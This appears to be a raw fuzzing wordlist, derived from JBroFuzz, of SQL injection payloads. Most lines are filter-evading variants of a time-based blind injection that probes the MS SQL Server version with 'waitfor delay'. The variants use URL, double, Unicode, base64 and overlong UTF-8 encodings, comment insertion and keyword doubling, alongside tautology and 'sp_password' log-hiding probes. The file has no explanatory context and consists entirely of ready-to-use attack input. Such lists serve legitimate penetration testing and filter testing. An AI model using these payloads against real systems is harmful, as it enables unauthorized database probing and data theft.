# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)
%00
IyBjb250YWlucyBzdGF0ZW1lbnRzIGZyb20gamJyb2Z1enogKDEzIEFwcmlsIDIwMTApCg==
# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

%2523%2520%2563%256F%256E%2574%2561%2569%256E%2573%2520%2573%2574%2561%2574%2565%256D%2565%256E%2574%2573%2520%2566%2572%256F%256D%2520%256A%2562%2572%256F%2566%2575%257A%257A%2520%2528%2531%2533%2520%2541%2570%2572%2569%256C%2520%2532%2530%2531%2530%2529%250A
%23%20%63%6F%6E%74%61%69%6E%73%20%73%74%61%74%65%6D%65%6E%74%73%20%66%72%6F%6D%20%6A%62%72%6F%66%75%7A%7A%20%28%31%33%20%41%70%72%69%6C%20%32%30%31%30%29%0A
%u0023%u0020%u0063%u006F%u006E%u0074%u0061%u0069%u006E%u0073%u0020%u0073%u0074%u0061%u0074%u0065%u006D%u0065%u006E%u0074%u0073%u0020%u0066%u0072%u006F%u006D%u0020%u006A%u0062%u0072%u006F%u0066%u0075%u007A%u007A%u0020%u0028%u0031%u0033%u0020%u0041%u0070%u0072%u0069%u006C%u0020%u0032%u0030%u0031%u0030%u0029%u000A
# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements FRFROMOM jbrofuzz (13 April 2010)

%C0%AB%C0%AAcontains%C0%AAstatements%C0%AAfrom%C0%AAjbrofuzz%C0%AA%C0%AA13%C0%AAApril%C0%AA2010%C0%AB%C0%8A
%# %c%o%n%t%a%i%n%s %s%t%a%t%e%m%e%n%t%s %f%r%o%m %j%b%r%o%f%u%z%z %(%1%3 %A%p%r%i%l %2%0%1%0%)%

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)
 and '0having'='0having'
# contains statements from jbrofuzz (13 April 2010)
sp_password
#/**/contains/**/statements/**/from/**/jbrofuzz/**/(13/**/April/**/2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

#%07contains%0Astatements%01from%04jbrofuzz%04(13%01April%0D2010)

# contains statements from jbrofuzz (13 April 2010)

#%09contains%09statements%09from%0Djbrofuzz%0B(13%0AApril%092010)

# contains statements from jbrofuzz (13 April 2010)

#+contains+statements+from+jbrofuzz+(13+April+2010)

#%0Dcontains%09statements%0Cfrom%09jbrofuzz%0A(13%09April%0C2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

# contains statements from jbrofuzz (13 April 2010)

%EF%BC%87; if not(substring((select @@version),25,1) <> 0) waitfor delay %EF%BC%870:0:2%EF%BC%87 --

%00%27; if not(substring((select @@version),25,1) <> 0) waitfor delay %00%270:0:2%00%27 --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
%00
JzsgaWYgbm90KHN1YnN0cmluZygoc2VsZWN0IEBAdmVyc2lvbiksMjUsMSkgPD4gMCkgd2FpdGZvciBkZWxheSAnMDowOjInIC0tCg==
'; if not(substring((select @@version),25,1) < NOT BETWEEN 0 AND 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

%2527%253B%2520%2569%2566%2520%256E%256F%2574%2528%2573%2575%2562%2573%2574%2572%2569%256E%2567%2528%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%252C%2532%2535%252C%2531%2529%2520%253C%253E%2520%2530%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2527%2520%252D%252D%250A
%27%3B%20%69%66%20%6E%6F%74%28%73%75%62%73%74%72%69%6E%67%28%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%2C%32%35%2C%31%29%20%3C%3E%20%30%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%27%20%2D%2D%0A
%u0027%u003B%u0020%u0069%u0066%u0020%u006E%u006F%u0074%u0028%u0073%u0075%u0062%u0073%u0074%u0072%u0069%u006E%u0067%u0028%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u002C%u0032%u0035%u002C%u0031%u0029%u0020%u003C%u003E%u0020%u0030%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0027%u0020%u002D%u002D%u000A
'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; /*!30459if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' */--

'; /*!00000if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' */--

'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --

'; if not(substring((SSELECTELECT @@version),25,1) <> 0) waitfor delay '0:0:2' --

%C0%AF%C0%BB%C0%AAif%C0%AAnot%C0%AAsubstring%C0%AA%C0%AAselect%C0%AA%C0%CA%C0%CAversion%C0%AB%C0%AE25%C0%AE1%C0%AB%C0%AA%C0%BE%C0%BE%C0%AA0%C0%AB%C0%AAwaitfor%C0%AAdelay%C0%AA%C0%AF0%C0%BA0%C0%BA2%C0%AF%C0%AA%C0%AF%C0%AF%C0%8A
%'%; %i%f %n%o%t%(%s%u%b%s%t%r%i%n%g%(%(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%,%2%5%,%1%) %<%> %0%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%' %-%-%

